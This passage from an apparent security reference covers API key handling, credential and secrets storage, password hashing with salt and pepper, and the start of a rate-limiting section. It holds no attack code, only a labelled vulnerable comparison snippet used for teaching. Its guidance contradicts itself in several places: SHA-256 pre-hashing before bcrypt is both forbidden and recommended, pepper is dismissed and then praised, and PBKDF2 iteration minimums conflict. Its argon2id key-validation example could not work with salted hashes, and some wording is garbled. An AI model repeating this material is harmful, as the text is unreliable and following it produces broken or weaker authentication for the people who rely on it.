**bcrypt Alternative**: Cost factor 12-14 minimum. Adequate for API keys but lacks memory-hardness of Argon2id. Simpler implementation for legacy systems.

**PBKDF2 Not Recommended**: Computationally expensive but parallelizable on GPUs. Use only when Argon2id/bcrypt unavailable with 600,000+ iterations (NIST SP 800-63B recommendation).

**Key Prefix Handling**: Store prefix in plaintext alongside hash for key type identification. Hash only the entropy portion: `sk_live_` + hash(random_bytes).

### Transmission Security

**HTTPS Mandatory**: API keys transmitted over TLS 1.2+ exclusively. Unencrypted transmission exposes keys to network eavesdropping. No exceptions for internal networks; assume breach scenarios.

**Header Placement**: Prefer custom headers (`X-API-Key`, `Authorization: ApiKey <key>`) over query parameters. Query parameters appear in server logs, browser history, and referrer headers. Body placement acceptable for POST requests but inconsistent across HTTP methods.

**Authorization Header Format**: `Authorization: Bearer <key>` follows OAuth 2.0 conventions, enabling consistent authentication middleware. Custom schemes like `Authorization: ApiKey <key>` clarify non-OAuth usage.

**Query Parameter Anti-Pattern**: Embedding keys in URLs (`/api/data?api_key=xyz`) exposes credentials through:

- Server access logs
- Proxy cache keys
- Browser history persistence
- HTTP Referer headers to third-party resources

### Scope and Permission Design

**Least Privilege Principle**: Each key grants minimum permissions required for intended use case. Separate keys for read vs. write operations, production vs. development environments, or per-resource access.

**Key Hierarchies**:

- **Master Keys**: Administrative access to key management endpoints. Rotated frequently. Never distributed to clients.
- **Service Keys**: Backend-to-backend communication. Scoped to specific service interactions.
- **Publishable Keys**: Client-side usage for non-sensitive operations. Acceptable for public exposure (e.g., Stripe public keys).

**Environment Segregation**: Production keys never used in development/staging environments. Separate key pools prevent accidental production access from non-production systems.

**Resource-Based Scoping**: Keys bound to specific resources (customer ID, project ID, tenant ID). Prevents lateral movement across customer data boundaries in multi-tenant systems.

### Rate Limiting Integration

**Per-Key Rate Limits**: Track request counts per API key rather than IP address. Prevents single compromised key from exhausting rate limit quotas for legitimate users sharing IP ranges (NAT, proxies).

**Quota Enforcement**: Associate keys with usage quotas (requests/day, bandwidth/month). Emit quota exhaustion errors with remaining quota metadata in response headers.

**Burst vs. Sustained Limits**: Token bucket or leaky bucket algorithms allow short bursts while enforcing sustained rate caps. Configuration example: 100 requests/second burst, 1000 requests/minute sustained.

**Distributed Rate Limiting**: Redis sorted sets or Memcached counters track request counts across API gateway instances. Accept eventual consistency; brief quota overruns acceptable for performance.

### Key Rotation Strategies

**Dual Key Support**: Issue replacement key while honoring old key during rotation window. Client updates to new key without service interruption. Revoke old key after grace period (24-72 hours typical).

**Forced Rotation**: Automated rotation based on time (90-day maximum recommended), usage thresholds, or security events. Balance security against operational complexity of credential updates.

**Rotation Notifications**: Programmatically notify key owners of pending expiration via webhook, email, or dashboard alerts. Provide sufficient lead time (2+ weeks) for client updates.

**Versioning Scheme**: Encode creation timestamp or version identifier in key prefix: `sk_v2_2024_`. Enables identification of old key versions for deprecation tracking.

### Compromise Detection and Revocation

**Anomaly Detection**:

- Geographic access patterns (new countries/regions)
- Request volume spikes (>3σ from baseline)
- Failed authentication attempts from valid key (password stuffing indicator)
- Access to previously unused endpoints (reconnaissance activity)

**Immediate Revocation**: Single-step revocation without grace period for confirmed compromises. Revoked keys rejected within seconds across distributed systems through cache invalidation.

**Revocation Propagation**: Pub/sub notifications to distributed API gateway instances. Accept temporary availability of revoked keys due to cache TTL (typically <60 seconds).

**Customer Notification**: Alert key owner of suspicious activity before automatic revocation. Provide self-service revocation controls in API dashboard.

### Logging and Audit Requirements

**Structured Logging**: Record key prefix (never full key), timestamp, endpoint, HTTP method, response status, client IP, user agent. Enable forensic analysis post-compromise.

**PII Considerations**: Mask or hash client IP addresses in logs for GDPR compliance. Retain only data necessary for security investigations.

**Log Retention**: Security logs retained 90 days minimum for incident response. Compliance requirements may mandate longer retention (1-7 years).

**Tamper Resistance**: Write logs to append-only storage (S3 with object lock, dedicated log aggregation service). Prevent attacker modification of audit trail post-compromise.

### Anti-Patterns and Vulnerabilities

**Embedding in Version Control**: Hardcoded keys committed to Git repositories. Discovered via automated secret scanning (TruffleHog, GitGuardian). Requires immediate revocation even after removal from history.

**Client-Side JavaScript Exposure**: API keys in frontend code visible in browser DevTools, page source, and network traffic. Acceptable only for publishable keys designed for public exposure.

**Shared Keys Across Customers**: Single key reused across multiple clients prevents granular access control and attribution. Compromise impacts all users sharing credential.

**Missing Expiration**: Keys valid indefinitely accumulate risk over time. Stale keys from terminated employees or decommissioned systems remain active attack vectors.

**Insufficient Entropy**: Predictable key generation (UUID v1 with timestamp, sequential IDs) enables brute force enumeration. Always use cryptographic randomness.

**Logged in Plaintext**: Full API keys written to application logs, error messages, or monitoring systems. Treat keys as sensitive credentials; log only non-secret prefixes.

**URL Encoding Issues**: Special characters in base64-encoded keys require URL encoding in query parameters. Use base64url encoding (replaces `+` with `-`, `/` with `_`) to avoid encoding complexity.

### Migration from API Keys

**OAuth 2.0 Transition**: Replace static keys with short-lived access tokens and refresh token flows. Supports fine-grained scopes, revocation, and user consent flows. Higher implementation complexity.

**Mutual TLS (mTLS)**: Client certificates provide cryptographic authentication without shared secrets. Requires PKI infrastructure and certificate lifecycle management.

**HMAC Signatures**: Request signing with private keys prevents key exposure in transit. Client signs request parameters; server validates signature. Example: AWS Signature Version 4.

**JWT Bearer Tokens**: Self-contained tokens with embedded claims and expiration. Reduces database lookups but requires public key distribution for signature verification.

### Monitoring Metrics

**Authentication Failure Rate**: Failed authentication attempts per key. Sustained failures indicate brute force attempts or compromised key rotation issues.

**Unique Key Usage**: Active keys over time windows. Declining usage indicates abandoned keys requiring revocation.

**Permission Denial Rate**: Authorized but forbidden requests indicate misconfigured key scopes or reconnaissance activity.

**Latency Distribution**: Authentication operation latency. Slowdowns indicate hash computation bottlenecks or storage layer degradation.

**Key Age Distribution**: Histogram of key creation dates. Long-lived keys (>180 days) indicate rotation policy violations.

### Compliance Considerations

**PCI DSS Requirements**: API keys granting access to cardholder data must follow PCI DSS 3.2.1 requirement 8.2.1 (strong cryptography for authentication). Key rotation every 90 days mandatory.

**SOC 2 Type II**: Document key generation, distribution, rotation, and revocation procedures. Demonstrate audit logging and access controls in compliance reports.

**GDPR Data Processor**: API keys accessing personal data require data processing agreements with customers. Key compromise constitutes data breach requiring notification within 72 hours.

### Related Topics

OAuth 2.0 client credentials flow, JWT authentication, HMAC request signing, certificate-based authentication, secrets management patterns, credential rotation automation, zero-trust security model, API gateway authentication, service mesh authentication

---

## Credential Storage Patterns

Credential storage requires cryptographic protection against breach scenarios where attackers gain database access, memory dumps, or configuration file exposure. Storage mechanisms must resist offline attacks while maintaining acceptable authentication latency.

### Hashing Algorithms for Password Storage

**Adaptive Cost Functions** Modern password hashing uses computationally expensive algorithms with configurable work factors that scale with hardware improvements:

```python
# bcrypt - cost factor 10-12 recommended (2024)
bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))

# Argon2id - winner of Password Hashing Competition
argon2id(password, salt, memory=64MB, iterations=3, parallelism=4)

# scrypt
scrypt(password, salt, N=32768, r=8, p=1, dkLen=64)
```

**Argon2id** is the current recommendation: hybrid of Argon2i (data-independent, side-channel resistant) and Argon2d (data-dependent, GPU-resistant). Memory-hard property prevents parallel attacks using GPUs/ASICs.

**Cost Parameter Selection** Target 250-500ms server-side computation time. Balance security against DoS risk from expensive operations. Monitor authentication latency at P95/P99 percentiles.

### Anti-Patterns in Password Storage

**Reversible Encryption** Encrypted passwords (AES, DES) require key storage. Key compromise exposes all credentials. Encryption enables decryption—unnecessary for authentication which only requires hash comparison.

**Fast Cryptographic Hashes** SHA-256, SHA-512, MD5 compute in microseconds. Attackers perform billions of hash attempts per second using GPUs. These algorithms lack adaptive cost factors.

**Insufficient Salt Usage**

- **No Salt**: Identical passwords produce identical hashes, enabling rainbow table attacks
- **Global Salt**: Single salt for all users allows precomputation attacks after salt discovery
- **Short Salt** (< 16 bytes): Reduces search space for precomputation attacks

Correct implementation: cryptographically random, unique per-credential salt ≥ 16 bytes.

**Client-Side Hashing Only** Transmitting hashed passwords makes the hash the effective credential. Server stores hash-of-hash with no security improvement. Client-side hashing must combine with server-side hashing of different algorithm.

### API Key and Token Storage

**Database Storage** Store cryptographic hashes, not plaintext keys:

```python
# Generation
raw_key = secrets.token_urlsafe(32)  # 256 bits entropy
key_hash = argon2id(raw_key)  # Store hash
# Return raw_key once to user, never store plaintext

# Validation
provided_key_hash = argon2id(provided_key)
constant_time_compare(stored_hash, provided_key_hash)
```

**Prefix-Based Identification** Include non-secret prefix for key identification without database query:

```
ghp_abc123...  # GitHub Personal Access Token
sk_live_xyz789...  # Stripe Secret Key
```

Prefix enables logging/monitoring without exposing secret portion.

**Key Rotation and Versioning** Multi-key support allows rotation without service interruption:

```sql
CREATE TABLE api_keys (
    key_id UUID PRIMARY KEY,
    key_hash TEXT NOT NULL,
    version INT NOT NULL,
    created_at TIMESTAMP,
    last_used_at TIMESTAMP,
    expires_at TIMESTAMP
);
```

### Secrets Management Systems

**Vault Architecture** HashiCorp Vault, AWS Secrets Manager, Azure Key Vault externalize credential storage:

- **Dynamic Secrets**: Generate short-lived credentials on-demand (database credentials valid 1 hour)
- **Encryption as a Service**: Application sends plaintext, receives ciphertext without managing keys
- **Audit Logging**: Complete access history for compliance
- **Lease Renewal**: Automatic credential rotation before expiration

**Initialization and Unsealing** Vault requires unsealing after restart using Shamir's Secret Sharing (threshold scheme: 3-of-5 key shares required). Prevents single-point compromise.

**Secret Engines**

- **KV Store**: Versioned key-value pairs
- **Database Engine**: Dynamic database credentials with TTL
- **PKI Engine**: X.509 certificate generation
- **Cloud IAM**: Temporary cloud provider credentials

### Environment Variable and Configuration Patterns

**Anti-Pattern: Committed Secrets** Version control with plaintext credentials enables:

- Historical analysis revealing deleted secrets
- Fork propagation across repositories
- Public exposure via accidental public repository

**Encrypted Configuration Files**

```bash
# Mozilla SOPS with KMS integration
sops -e -k arn:aws:kms:region:account:key/id config.yaml > config.enc.yaml
```

Decrypt at runtime using IAM permissions. Supports key rotation without re-encrypting all files.

**Environment Variable Injection** Container orchestration (Kubernetes Secrets, Docker Swaps secrets) injects credentials as environment variables or mounted files:

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  username: YWRtaW4=  # base64 encoded
  password: c2VjdXJldHBhc3N3b3Jk  # base64 encoded
```

**[Inference]** Base64 encoding provides no security—only prevents casual observation. Kubernetes Secrets require etcd encryption at rest.

### Memory Protection

**Zeroing Sensitive Memory** Overwrite credential buffers after use to prevent memory dump exposure:

```go
// Go example
password := []byte("secret")
defer func() {
    for i := range password {
        password[i] = 0
    }
}()
```

Compiler optimizations may eliminate "dead" writes. Use memory barriers or volatile operations.

**Protected Memory Regions** OS-level features prevent swapping sensitive pages to disk:

```c
// POSIX mlock
mlock(password_buffer, buffer_size);
// Prevent page from being swapped to disk
```

**String Immutability Issues** Immutable string types (Java String, Python str) persist in memory until garbage collection. Use mutable byte arrays with explicit zeroing.

### Hardware Security Modules (HSM)

**FIPS 140-2/140-3 Compliance** Physical tamper-resistant devices for cryptographic operations. Private keys never leave HSM boundary. API provides signing/encryption operations without key extraction.

**Cloud HSM Integration** AWS CloudHSM, Azure Dedicated HSM provide FIPS 140-2 Level 3 single-tenant hardware. Integrated with KMS for key hierarchy: Master Key in HSM, data encryption keys encrypted under master key.

**Performance Characteristics** HSM operations: 1,000-10,000 operations/second vs millions for software crypto. Network latency adds overhead. Cache derived keys for high-throughput scenarios.

### OAuth Token Storage

**Refresh Token Rotation** Issue single-use refresh tokens. Each refresh operation invalidates previous token and issues new pair:

```
POST /token
grant_type=refresh_token&refresh_token=OLD_TOKEN

Response:
{
  "access_token": "NEW_ACCESS",
  "refresh_token": "NEW_REFRESH",  // Old token now invalid
  "expires_in": 3600
}
```

**Token Binding** Cryptographically bind tokens to client certificates or device fingerprints. Stolen token unusable without corresponding private key.

**Storage Location Trade-offs**

|Location|XSS Vulnerable|CSRF Vulnerable|Survives Tab Close|
|---|---|---|---|
|LocalStorage|Yes|No|Yes|
|SessionStorage|Yes|No|No|
|Cookie (HttpOnly)|No|Yes (mitigate with SameSite)|Yes|
|Memory|Yes|No|No|

Recommendation: HttpOnly, Secure, SameSite=Strict cookies for refresh tokens. Access tokens in memory-only storage.

### Database Credential Management

**Principle of Least Privilege** Application connections use accounts with minimal required permissions:

```sql
CREATE USER app_readonly WITH PASSWORD 'hash';
GRANT SELECT ON TABLE users, products TO app_readonly;
REVOKE ALL ON TABLE admin_config FROM app_readonly;
```

**Connection Pooling Security** Pooled connections reuse authentication. Compromised application gains persistent database access. Mitigate with:

- Network segmentation (application VPC ↔ database VPC)
- Connection timeout and max lifetime settings
- Statement timeouts preventing resource exhaustion

**Dynamic Database Credentials** Generate temporary credentials per application instance:

```
# Vault database engine
vault read database/creds/readonly-role

Key             Value
lease_id        database/creds/readonly-role/abc123
lease_duration  1h
username        v-token-readonly-xyz789
password        A1b2C3d4E5f6
```

Automatic revocation at lease expiration. Compromised credential has limited validity window.

### Certificate and Private Key Storage

**PEM File Permissions** Restrict private key file access:

```bash
chmod 600 /etc/ssl/private/server.key
chown root:root /etc/ssl/private/server.key
```

World-readable private keys enable impersonation attacks.

**PKCS#12 Password Protection** Bundle certificate + private key with password encryption:

```bash
openssl pkcs12 -export -out cert.p12 -inkey private.key -in cert.pem -passout pass:strong_password
```

**[Inference]** Password must have sufficient entropy (≥128 bits) to resist brute force against PKCS#12 encryption.

**Certificate Pinning Storage** Mobile applications embed expected certificate hashes. Prevents MITM with rogue CA certificates:

```swift
// iOS example
let pinnedHashes = ["sha256/AAAAAAA...", "sha256/BBBBBBB..."]
```

Requires update mechanism for certificate rotation. Backup pins prevent service disruption during rotation.

### Timing Attack Prevention

**Constant-Time Comparison** Variable-time comparison leaks information through timing channels:

```python
# VULNERABLE
if stored_hash == provided_hash:
    return True

# SECURE
import hmac
hmac.compare_digest(stored_hash, provided_hash)
```

Early exit on first mismatched byte reveals partial secret information through repeated timing measurements.

### Compliance and Regulatory Requirements

**PCI DSS 4.0**

- Requirement 3.4.1: Render PAN unreadable (strong cryptography)
- Requirement 8.3.2: Strong cryptographic controls for authentication credentials
- Requirement 3.5.1: Documented key management procedures

**GDPR Article 32** Pseudonymization and encryption of personal data. Credential breach requires notification within 72 hours.

**NIST SP 800-63B** Password storage using approved hash functions (PBKDF2, bcrypt, scrypt, Argon2). Minimum 10,000 iterations for PBKDF2.

### Monitoring and Detection

**Failed Authentication Patterns**

- Credential stuffing: High volume authentication attempts with valid username/password pairs from breaches
- Brute force: Sequential attempts against single account
- Password spraying: Single password across many accounts

Rate limiting, CAPTCHA, account lockout mitigate attacks but impact legitimate users.

**Secret Scanning in Code** Pre-commit hooks detect high-entropy strings matching credential patterns:

```bash
# Using truffleHog, git-secrets, or gitleaks
git secrets --scan
```

**Anomalous Access Patterns**

- Geographic impossibility (logins from distant locations within minutes)
- Unusual access times (outside normal usage patterns)
- Privilege escalation attempts
- Bulk data access with valid credentials

Related topics: Key derivation functions, Secure enclave usage (iOS/Android), TPM integration, Secret sharing schemes, Zero-knowledge proof authentication, Hardware token integration (FIDO2/WebAuthn)

---

## Password Hashing Security Patterns

### Algorithm Selection and Configuration

**Argon2id Standard** Use Argon2id as default password hashing algorithm. Combines Argon2i (data-independent memory access, resistant to side-channel attacks) with Argon2d (data-dependent access, resistant to GPU cracking). Winner of Password Hashing Competition (2015). Configure minimum parameters: memory cost 19MiB (m=19456), time cost 2 iterations (t=2), parallelism 1 (p=1). Adjust based on available resources and authentication latency tolerance (target 250-500ms per hash on commodity hardware).

**bcrypt for Legacy Compatibility** When Argon2 unavailable, use bcrypt with minimum cost factor 12 (2^12 iterations). Never use cost below 10. Increment cost annually as hardware improves. [Inference] Cost 12 provides ~300ms computation time on modern CPUs. Limitation: maximum password length 72 bytes; truncates input via null-termination vulnerability if not pre-hashed.

**PBKDF2 as Fallback** PBKDF2-HMAC-SHA256/SHA512 acceptable when Argon2/bcrypt unavailable (legacy systems, compliance requirements). Minimum 310,000 iterations for SHA-256, 120,000 for SHA512 (OWASP 2023 recommendations). [Unverified] Iteration counts increase annually; verify current OWASP standards. Weakness: parallelizable on GPUs unlike memory-hard functions.

### Salt Generation and Management

**Cryptographically Random Salts** Generate minimum 16-byte (128-bit) salts using CSPRNG (`/dev/urandom`, `secrets` module, `crypto.randomBytes()`). Never use predictable sources (`Math.random()`, timestamps, user IDs). Unique salt per password eliminates rainbow table attacks and prevents identical password detection across users.

**Salt Storage Pattern** Store salt alongside hash in single database field using standardized format: `$algorithm$parameters$salt$hash`. Example: `$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$hash_output`. Enables algorithm migration without schema changes. Libraries (passlib, bcrypt) handle formatting automatically.

**No Pepper Required Pattern** Pepper (application-wide secret added to password before hashing) provides minimal security benefit with operational complexity. If pepper compromised, all passwords vulnerable. If stored securely (HSM, secrets manager), adds key management burden. Focus resources on proper algorithm parameters and monitoring instead.

### Implementation Anti-Patterns

**Pre-Hashing Input Trap** Never SHA-256 hash passwords before bcrypt to bypass 72-byte limit. Creates attack surface: attacker needs to find SHA-256 collision, not actual password. If pre-hashing required, use HMAC with dedicated pepper key, not plain hash.

**Timing Attack Vulnerabilities** Use constant-time comparison for hash verification. `hash1 == hash2` short-circuits on first mismatch, leaking information via timing. Use `crypto.timingSafeEqual()`, `hmac.compare_digest()`, or equivalent. Apply same principle to username/email lookup during authentication.

**Database Indexing on Hashes** Never create database index on password hash column. Index structure leaks information about hash distribution. Authentication lookup should occur on username/email (indexed), then verify hash in application code.

### Migration and Upgrade Patterns

**Lazy Upgrade Pattern** Store algorithm identifier with each hash. During authentication:

1. Verify password against stored hash
2. If algorithm outdated (old bcrypt cost, migrating to Argon2), rehash with current parameters
3. Update database record atomically

Transparent migration without forcing password resets. Dual-hash temporary state not required.

**Account Enumeration Prevention** Execute full hashing operation even when user doesn't exist. Prevents timing attacks distinguishing valid/invalid usernames. Hash dummy password with realistic parameters: `argon2.hash('dummy_password_constant')`. Return identical error message for invalid username and invalid password.

### Pepper and Key Derivation Patterns

**HMAC-Based Pepper Implementation** If pepper required (regulatory compliance), implement as HMAC: `hash = Argon2(HMAC-SHA256(key, password))`. Store HMAC key in secrets management system (Vault, AWS Secrets Manager), not application config. Rotate key requires rehashing all passwords; plan rotation strategy before implementation.

**Multi-Factor Hash Binding** For high-security contexts, bind device-specific entropy to password hash: `Argon2(password || device_secret)`. Device secret stored client-side (secure enclave, TPM). [Inference] Compromised password hash unusable without device access. Complicates account recovery and multi-device access; document trade-offs.

### Performance and Denial of Service

**Adaptive Work Factor Throttling** [Unverified] Implement rate limiting before hash verification to prevent computational DoS. Failed authentication attempts consume identical resources as successful ones. Use token bucket or sliding window: 5 attempts per 15 minutes per IP/account. Apply at application layer, not relying solely on infrastructure rate limiting.

**Parallel Hash Verification** For authentication systems handling 10,000+ req/s, distribute hash verification across worker pool. Never block event loop. Use job queue (Redis, RabbitMQ) for async verification with result callback. [Inference] Single-threaded verification becomes bottleneck at scale despite proper algorithm selection.

### Password Policy Integration

**Length Over Complexity** Enforce minimum 12-character length without maximum (except bcrypt 72-byte limit). Reject only passwords in breach databases (Have I Been Pwned API). Character complexity requirements (uppercase, numbers, symbols) reduce entropy by making passwords predictable. Allow spaces and full Unicode; validate UTF-8 encoding before hashing.

**Breach Detection Integration** Check password against known breaches during registration/change using k-anonymity API: send first 5 hex characters of SHA-1 hash, receive suffixes of matching breached passwords. Compare locally without exposing password. Reject any match regardless of breach frequency.

### Storage Format Standards

**PHC String Format** Adopt Password Hashing Competition string format for interoperability:

```
$<id>[$v=<version>][$<param>=<value>(,<param>=<value>)*][$<salt>[$<hash>]]
```

Example: `$argon2id$v=19$m=65536,t=2,p=4$c2FsdA$hash`. Enables seamless library transitions and algorithm upgrades without custom parsers.

**Binary vs ASCII Storage** Store PHC strings as VARCHAR in databases for human readability during debugging. Binary BLOB storage saves space (~20% smaller) but complicates inspection. Prefer ASCII unless storage costs critical.

### Multi-Tenant and Sharding Patterns

**Per-Tenant Pepper Isolation** In multi-tenant SaaS, use tenant-specific pepper keys to cryptographically isolate password stores. Tenant A compromise doesn't expose Tenant B hashes. Requires key management per tenant; document operational complexity.

**Shard-Aware Hash Distribution** When sharding user database, hash passwords on application server before distribution. Never transmit plaintext passwords between services. Use mTLS for authentication service communication. [Inference] Centralized authentication service reduces attack surface versus distributed password verification.

### Hardware Security Module Integration

**HSM for Pepper Key Management** Store pepper HMAC keys in HSM for high-compliance environments (PCI DSS Level 1, FedRAMP). Authentication flow: send password to HSM, receive HMAC output, hash locally. Network latency adds 5-20ms per operation; acceptable for human authentication, prohibitive for API token validation.

**TPM for Client-Side Hashing** [Speculation] Emerging pattern: leverage client TPM to derive password hash before transmission. Server stores double-hashed value. Prevents server compromise from exposing reversible hashes. Requires TPM 2.0 support across client devices; currently impractical for web applications.

### Anti-Patterns

**Custom Algorithm Implementation** Never implement cryptographic primitives. Use audited libraries (libsodium, bcrypt.js, argon2-cffi). Subtle implementation errors (padding oracle, side channels) create vulnerabilities undetectable in code review.

**Hash Concatenation Schemes** Avoid `MD5(password) + SHA1(password)` or similar "defense in depth" constructions. Does not increase security; both must be broken independently. Increases computational cost without benefit. Use single properly-configured modern algorithm.

**Reversible Encryption** Never encrypt passwords with AES or similar symmetric encryption. Encryption implies decryption key exists; creates single point of total failure. Password hashing must be one-way by design.

**Rate Limiting Hash Verification Only** Applying rate limits solely to failed attempts allows attackers unlimited attempts with valid credentials. Limit all authentication attempts per account/IP regardless of outcome. Track successful authentications for anomaly detection.

**Related Topics:** Session token generation and rotation, password recovery flow security, passwordless authentication patterns (WebAuthn, magic links), account lockout strategies, credential stuffing defense mechanisms, zero-knowledge password protocols (OPAQUE, SRP)

---

## Salt and Pepper

### Cryptographic Fundamentals

**Salt** is a unique, randomly generated value appended to each password before hashing. Stored alongside the hash in plaintext, salt prevents rainbow table attacks and ensures identical passwords produce different hashes. Minimum entropy: 128 bits (16 bytes). Generated using cryptographically secure random number generators (CSRNG) like `/dev/urandom`, `SecureRandom`, or `crypto.randomBytes()`.

**Pepper** is a secret value added to passwords before hashing, shared across all password hashes in the system. Unlike salt, pepper is never stored in the database—kept in application configuration, environment variables, HSM (Hardware Security Module), or secret management systems (HashiCorp Vault, AWS Secrets Manager). Pepper provides defense-in-depth: database compromise alone cannot crack passwords without access to the pepper.

**Combined Pattern**: `hash(password + salt + pepper)` provides maximum protection. Salt ensures uniqueness, pepper ensures database exfiltration insufficient for offline attacks.

### Salt Implementation Requirements

**Uniqueness Guarantees**: Generate new salt per password, never reuse. Collision probability with 128-bit salt: negligible until ~2^64 hashes (birthday paradox). Avoid sequential or timestamp-based generation—predictable salts enable precomputation attacks.

**Storage Schema**: Store salt alongside hash in same database record. Common formats:

- Separate columns: `password_hash`, `password_salt`
- Combined PHC string format: `$algorithm$params$salt$hash` (e.g., `$argon2id$v=19$m=65536,t=3,p=4$base64salt$base64hash`)
- Modular Crypt Format (MCF): `$id$rounds$salt$hash`

**Encoding**: Base64 or hexadecimal encoding for database storage. Avoid raw binary storage unless using BYTEA/BLOB columns. Base64 increases size by 33% but simplifies handling.

**Migration Strategy**: Rehash passwords with proper salt during authentication when detecting legacy unsalted hashes. Implement versioned hash format to identify migration candidates: `v1:md5hash` vs `v2:$bcrypt$...`.

### Pepper Implementation Requirements

**Secret Management**: Never hardcode pepper in source code or commit to version control. Rotate pepper independently of application deployments. Store in:

- Environment variables (least secure, acceptable for non-critical systems)
- Secret management services with audit trails and access controls
- HSMs for PCI-DSS/HIPAA compliance scenarios

**Multiple Pepper Strategy**: Use pepper versioning to enable rotation without invalidating existing hashes. Store pepper version identifier with each hash:

```
hash_record = {
  hash: computed_hash,
  salt: random_salt,
  pepper_version: 2
}
```

On authentication: retrieve pepper using stored version. On successful auth: rehash with current pepper version.

**Length Requirements**: Minimum 256 bits (32 bytes). Longer peppers provide no additional security against brute-force but increase memory/CPU usage. Balance: 32-64 bytes.

**Application-Level Enforcement**: Apply pepper before passing to password hashing function. Never delegate pepper handling to database layer—defeats purpose if database compromised.

### Algorithm Selection

**bcrypt**: Industry standard, salt built-in (128-bit), cost factor adjustable (10-12 recommended as of 2024). Maximum password length: 72 bytes (limitation of Blowfish). Truncates longer passwords—hash input with SHA-256 first if supporting passphrases.

**scrypt**: Memory-hard function resistant to GPU/ASIC attacks. Parameters: N (CPU/memory cost, 2^14-2^16), r (block size, 8), p (parallelization, 1). Higher memory costs than bcrypt but slower adoption in libraries.

**Argon2**: Winner of Password Hashing Competition (2015). Three variants:

- **Argon2d**: Maximize GPU resistance, vulnerable to side-channel attacks
- **Argon2i**: Side-channel resistant, lower GPU resistance
- **Argon2id** (recommended): Hybrid approach, balances both threats

Parameters: memory (64MB+), iterations (3+), parallelism (4+ threads). Configurable time/memory trade-offs.

**PBKDF2**: Legacy option, computationally expensive but no memory hardness. Minimum 100,000 iterations (OWASP 2023), preferably 600,000+. Use PBKDF2-HMAC-SHA256 or SHA512. Avoid for new systems—bcrypt/Argon2 superior.

### Pepper Rotation Protocol

**Zero-Downtime Rotation**:

1. Deploy new pepper (version N+1) alongside existing (version N)
2. Application supports both versions for authentication
3. On successful auth with old pepper, rehash with new pepper
4. Monitor pepper version distribution in database
5. After 90-95% migration (or password expiry period), deprecate old pepper
6. Remove old pepper from configuration

**Emergency Rotation**: If pepper compromise suspected:

1. Immediately invalidate all sessions
2. Force password reset for all users
3. Deploy new pepper
4. Existing hashes unusable—require users to reset passwords

**Pepper Compromise Detection**: Implement audit logging, access monitoring, and integrity checks on secret storage. Unauthorized secret access triggers incident response.

### Anti-Patterns

**Global Salt**: Using single salt for all passwords eliminates primary benefit. Attackers build rainbow table once, crack all passwords. Always use per-password salt.

**Short Salt**: Salt < 128 bits reduces collision resistance. 64-bit salt reaches birthday bound at ~4 billion hashes. Modern systems generate trillions of hashes.

**Predictable Salt**: Using usernames, email addresses, timestamps, or sequential IDs as salt enables precomputation. Use CSRNG exclusively.

**Database-Stored Pepper**: Defeats purpose entirely. Pepper must remain separate from hashed data storage. If attacker has database, they have pepper.

**Pepper Without Versioning**: Impossible to rotate without breaking all existing hashes. Implement versioning from initial deployment.

**Client-Side Hashing**: Hashing password on client before transmission treats hash as password. Server must still apply proper salt/pepper/hashing. Client-side hashing useful for transport security but doesn't replace server-side hashing.

**Fast Hash Functions**: Using MD5, SHA-1, SHA-256 directly without key derivation functions enables GPU-accelerated brute-force. Modern GPUs compute billions of SHA-256 hashes per second. Use purpose-built password hashing algorithms.

**Insufficient Work Factor**: bcrypt cost factor 4-6 crackable in hours. Annual recalibration required—increase cost factor as hardware improves. Target: 250-500ms per hash on server hardware.

**Pepper in Database Encrypted Column**: If database compromised, encryption keys likely compromised too. Pepper must reside outside database infrastructure entirely.

**Missing Input Validation**: Extremely long password inputs cause DoS via expensive hash computation. Enforce maximum length (128-256 chars) before hashing.

### Edge Cases

**Hash Length Limitations**: bcrypt truncates at 72 bytes. For supporting long passphrases, pre-hash with SHA-256: `bcrypt(SHA256(password) + salt)`. Document this approach—affects password validation logic.

**Unicode Normalization**: Passwords containing Unicode characters may have multiple representations (é vs e+combining-accent). Apply Unicode normalization (NFC or NFKC) before hashing. Inconsistent normalization prevents authentication.

**Binary Salt Storage**: When using binary columns, ensure ORM/database driver doesn't corrupt data via character encoding conversions. Validate round-trip integrity during testing.

**Timing Attacks on Pepper Lookup**: Constant-time comparison when validating pepper versions. Variable timing may leak pepper existence or versioning strategy.

**Pepper Storage in Container Environments**: Kubernetes secrets, Docker secrets, or cloud provider secret managers. Never bake into container images. Mount at runtime via volumes or environment injection.

**Regulatory Compliance**: PCI-DSS 4.0 requires cryptographic hashing with salt. GDPR right-to-erasure applies to authentication credentials—plan for secure deletion. HIPAA demands encryption at rest for ePHI—pepper rotation must maintain audit trails.

**Database Migration**: Exporting/importing databases containing salted hashes safe—salt stored with hash. Pepper must be migrated separately through secure channels. Document pepper transfer procedures in runbooks.

**Hash Algorithm Migration**: Detecting hash format via stored identifier enables gradual migration:

```
if (hash_version == "v1") {
  validate_with_pbkdf2()
  on_success: rehash_with_argon2()
} else if (hash_version == "v2") {
  validate_with_argon2()
}
```

**Stateless Authentication Systems**: JWT-based auth doesn't store passwords server-side. Salt/pepper applies only during registration and password changes. Store hash in user database, issue JWT post-authentication.

**Multi-Tenant Systems**: Separate pepper per tenant or global pepper decision depends on isolation requirements. Per-tenant pepper: tenant database breach doesn't compromise others. Global pepper: simpler key management, acceptable if tenant data co-located.

**Backup and Disaster Recovery**: Pepper must be included in backup procedures. Encrypted backups of secret management systems. Test restoration procedures include pepper availability verification.

Related topics: Key derivation functions (KDF), HMAC-based authentication, adaptive hashing strategies, hardware security modules (HSM), secret rotation automation, cryptographic key hierarchy, side-channel attack prevention, password strength policies, breach detection and response.

---

## Rate Limiting for Security

### Algorithm Selection

**Token Bucket**

Allows burst traffic while enforcing average rate. Bucket capacity defines maximum burst size, refill rate defines sustained throughput. Implementation: track tokens and last refill timestamp per identifier. Calculate tokens to add based on elapsed time, cap at bucket size, deduct request cost. Optimal for APIs with legitimate burst patterns. Token cost can vary per endpoint—expensive operations consume more tokens.

**Leaky Bucket**

Enforces strict constant rate, smooths bursts into steady outflow. Requests queue when bucket full, processed at fixed rate. Implementation: maintain queue with timestamps, process at fixed intervals. Prevents burst attacks but may degrade user experience during legitimate spikes. Memory concerns for queue storage under attack—implement maximum queue size with rejection beyond threshold.

**Fixed Window**

Counts requests within fixed time windows (minute, hour). Reset count at window boundary. Critical flaw: boundary exploitation—attacker sends maximum requests at end of window N and beginning of window N+1, achieving 2x rate in short interval. Simple implementation but vulnerable to burst attacks at boundaries.

**Sliding Window Log**

